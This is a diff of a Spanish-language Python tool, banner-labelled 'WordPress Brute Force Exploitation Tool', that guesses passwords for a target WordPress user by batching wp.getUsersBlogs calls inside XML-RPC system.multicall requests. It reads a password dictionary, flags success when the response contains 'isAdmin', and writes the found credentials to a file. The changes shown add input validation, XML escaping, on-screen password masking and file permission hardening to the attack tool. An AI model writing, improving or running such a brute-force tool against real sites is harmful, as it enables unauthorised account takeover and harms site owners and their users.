@@ -2,16 +2,30 @@ import requests
 import time
 import os
 from colorama import Fore, Style, init
+from urllib.parse import urlparse
+import stat
 
 init(autoreset=True)
 
 def print_banner():
     """Imprime el banner de inicio"""
     banner = f"""
-{Fore.RED}╔══════════════════════════════════════════════════════════╗
-║                  WORDPRESS EXPLOIT                      ║
-║                  XML-RPC Multi-Call Attack               ║
-╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.RED}
+ ██╗    ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗███████╗███████╗
+ ██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝
+ ██║ █╗ ██║██║   ██║██████╔╝██████╔╝██████╔╝███████╗███████╗███████╗
+ ██║███╗██║██║   ██║██╔══██╗██╔═══╝ ██╔══██╗╚════██║╚════██║╚════██║
+ ╚███╔███╝╚██████╔╝██║  ██║██║     ██║  ██║███████║███████║███████║
+  ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+{Fore.YELLOW}
+ ╔═══════════════════════════════════════════════════════════════╗
+ ║{Fore.CYAN}     XML-RPC MULTI-CALL ATTACK SYSTEM v1.0{Fore.YELLOW}                     ║                                                      
+ ║{Fore.WHITE}      WordPress Brute Force Exploitation Tool{Fore.YELLOW}                  ║                       
+ ╠═══════════════════════════════════════════════════════════════╣
+ ║{Fore.LIGHTMAGENTA_EX}  ⚡ Created by: b3rd3{Fore.YELLOW}                                         ║                           
+ ║{Fore.LIGHTGREEN_EX}  🔓 Attack Type: XML-RPC System.Multicall{Fore.YELLOW}                     ║             
+ ║{Fore.LIGHTCYAN_EX}  ⚙️  Method: Parallel Password Batching{Fore.YELLOW}                        ║
+ ╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}                  
     """
     print(banner)
 
@@ -25,6 +39,16 @@ def get_user_input():
         print(f"{Fore.RED}[-] URL no válida. Abortando...{Style.RESET_ALL}")
         exit(1)
     
+    # Validar URL
+    try:
+        parsed = urlparse(target_url)
+        if parsed.scheme not in ['http', 'https']:
+            print(f"{Fore.YELLOW}[!] Advertencia: URL debe ser HTTP/HTTPS{Style.RESET_ALL}")
+            target_url = 'https://' + target_url if '://' not in target_url else target_url
+    except Exception as e:
+        print(f"{Fore.RED}[-] URL inválida: {e}{Style.RESET_ALL}")
+        exit(1)
+    
     # Obtener username
     username = input(f"{Fore.CYAN}[+] Ingresa el nombre de usuario a atacar: {Style.RESET_ALL}").strip()
     if not username:
@@ -33,8 +57,16 @@ def get_user_input():
     
     # Obtener diccionario
     dictionary_path = input(f"{Fore.CYAN}[+] Ingresa la ruta del diccionario: {Style.RESET_ALL}").strip()
-    if not os.path.exists(dictionary_path):
-        print(f"{Fore.RED}[-] Archivo no encontrado: {dictionary_path}{Style.RESET_ALL}")
+    
+    # Validar que sea un archivo legítimo
+    dictionary_path = os.path.abspath(dictionary_path)
+    if not os.path.isfile(dictionary_path):
+        print(f"{Fore.RED}[-] Archivo no encontrado o no es un archivo: {dictionary_path}{Style.RESET_ALL}")
+        exit(1)
+    
+    # Verificar que sea legible
+    if not os.access(dictionary_path, os.R_OK):
+        print(f"{Fore.RED}[-] No tienes permisos de lectura: {dictionary_path}{Style.RESET_ALL}")
         exit(1)
     
     # Obtener batch size
@@ -67,14 +99,17 @@ def get_user_input():
     return target_url, username, dictionary_path, batch_size
 
 def send_batch(url, user, pwd_list):
+    # Sanitizar usuario (prevenir inyección XML)
+    user_clean = user.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
+    
     xml = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
     for pwd in pwd_list:
-        pwd_clean = pwd.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+        pwd_clean = pwd.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
         xml += f'''
         <value><struct>
             <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
             <member><name>params</name><value><array><data>
-                <value><string>{user}</string></value>
+                <value><string>{user_clean}</string></value>
                 <value><string>{pwd_clean}</string></value>
             </data></array></value></member>
         </struct></value>'''
@@ -111,9 +146,12 @@ def main():
                     if result and 'isAdmin' in result: 
                         print(f"{Fore.GREEN}[!] ¡ÉXITO POTENCIAL! Credenciales encontradas:{Style.RESET_ALL}")
                         print(f"{Fore.GREEN}    Usuario: {username}{Style.RESET_ALL}")
-                        print(f"{Fore.GREEN}    Password: {password}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    Contraseña: {'*' * len(password)} ({len(password)} caracteres){Style.RESET_ALL}")
+                        # Guardar con permisos restrictivos
                         with open("resultado_exitoso.txt", "w") as out:
                             out.write(f"Usuario: {username}\nPassword: {password}\n\nRespuesta del servidor:\n{result}")
+                        # Establecer permisos 600 (solo dueño puede leer/escribir)
+                        os.chmod("resultado_exitoso.txt", stat.S_IRUSR | stat.S_IWUSR)
                         break
                     
                     print(f"{Fore.CYAN}[+] Lote enviado ({len(current_batch)} passwords). "
@@ -130,6 +168,8 @@ def main():
                 print(f"{Fore.GREEN}    Usuario: {username}{Style.RESET_ALL}")
                 with open("resultado_exitoso.txt", "w") as out:
                     out.write(result)
+                # Establecer permisos 600 (solo dueño puede leer/escribir)
+                os.chmod("resultado_exitoso.txt", stat.S_IRUSR | stat.S_IWUSR)
         
         print(f"\n{Fore.YELLOW}[*] Ataque completado. Total de passwords probadas: {password_count}{Style.RESET_ALL}")
     
